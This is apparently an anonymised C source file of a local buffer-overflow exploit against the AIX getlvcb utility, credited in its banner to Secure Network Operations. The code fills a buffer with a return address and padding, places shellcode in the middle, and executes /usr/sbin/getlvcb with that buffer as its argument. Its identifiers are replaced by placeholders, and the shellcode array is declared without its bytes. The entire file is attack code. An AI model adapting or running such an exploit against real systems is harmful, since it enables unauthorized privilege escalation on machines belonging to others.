
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 scalar_t__ VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (char*,char*,char*,int ) ;
 int FUNC_2 (int ) ;
 int FUNC_3 (char*) ;
 char* FUNC_4 (int) ;
 int FUNC_5 (char*,...) ;
 int * VAR_4 ;
 int FUNC_6 (int *) ;
 scalar_t__ FUNC_7 (char*,char*,int) ;

int FUNC_8( int VAR_5, char *VAR_6[ ] )
{
        int VAR_7;
    int VAR_8 = VAR_2, VAR_9 = VAR_0;
    unsigned long VAR_10, VAR_11, *VAR_12;
    char *VAR_13, *VAR_14;


        if( VAR_6[ 1 ] ) {
                if( FUNC_7( VAR_6[ 1 ], "-h", 3 ) == 0 || FUNC_7( VAR_6[ 1 ], "-H", 3 ) == 0 ) {
                FUNC_5( "\n\tUsage:  %s <buffer size> <offset>\n\n", VAR_6[ 0 ] );
            FUNC_2( 0 );
        }
        }

    if( VAR_5 > 1 ) {
        VAR_9 = FUNC_0( VAR_6[ 1 ] );
    }

    if( VAR_5 > 2 ) {
        VAR_8 = FUNC_0( VAR_6[ 2 ] );
    }

    VAR_11 = VAR_3 - VAR_8;

    FUNC_5( "\nSecure Network Operations (written by: mattox@secnetops.com)\n" );
    FUNC_5( "AIX Local getlvncb exploit\n\n" );
    FUNC_5( "Fixin to overwrite the address: 0x%x\n", VAR_11 );
    FUNC_5( "Using a buffer size of: %i\n", VAR_9 );
    FUNC_5( "And an offset of: %i\n", VAR_8 );

    if( !( VAR_13 = FUNC_4( VAR_9 ) ) ) {
        FUNC_5( "Coundn't allocate memory.\n" );
        FUNC_2( 0 );
    }


    VAR_14 = VAR_13 - 1;

    VAR_12 = ( long * )VAR_14;

    for( VAR_7 = 0; VAR_7 < VAR_9; VAR_7+=4 ) {
        *( VAR_12++ ) = VAR_11;
    }

    for( VAR_7 = 0; VAR_7 < ( VAR_9 / 2 ); VAR_7+=4 ) {
        VAR_13[ VAR_7 ] = ( unsigned long )VAR_1;
    }

    VAR_14 = VAR_13 + ( ( VAR_9 / 2 ) - ( FUNC_6( VAR_4 )/2 ) );

    for( VAR_7 = 0; VAR_7 < FUNC_6( VAR_4 ); VAR_7++ ) {
        *( VAR_14++ ) = VAR_4[ VAR_7 ];
    }

    VAR_13[ VAR_9 - 1 ] = '\0';

    FUNC_1( "/usr/sbin/getlvcb", "getlvcb", VAR_13, 0 );

    FUNC_3( VAR_13 );

    return 0;

}
